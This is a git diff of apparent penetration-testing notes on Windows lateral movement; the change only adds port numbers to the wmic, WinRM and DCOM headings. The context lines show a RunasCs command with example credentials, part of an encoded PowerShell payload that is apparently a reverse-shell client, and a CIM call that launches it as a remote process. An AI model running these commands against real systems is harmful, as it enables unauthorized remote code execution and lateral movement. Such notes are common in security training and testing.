@@ -27,7 +27,7 @@
 .\RunasCs.exe adm1 password1 "cmd /c echo admin > C:\Windows\admin" -l 8 --remote-impersonation
 ```
 
-### wmic (WMI)
+### wmic (WMI - 445)
 
 `wmic` is an alternative to RunasCs if we dont have file download permission or need to be stealthy
 
@@ -48,7 +48,7 @@ HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';
 Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
 ```
 
-### winrs (WinRM)
+### winrs (WinRM - 5985)
 
 Allows us to execute commands remotely
 
@@ -231,7 +231,7 @@ Mode                LastWriteTime         Length Name
 -a----        9/13/2022   2:52 AM              0 backup_schemata.txt
 ```
 
-### DCOM
+### DCOM (135)
 
 Interaction with DCOM is performed over RPC on TCP port 135 and local administrator access is required to call the DCOM Service Control Manager, which is essentially an API.
 
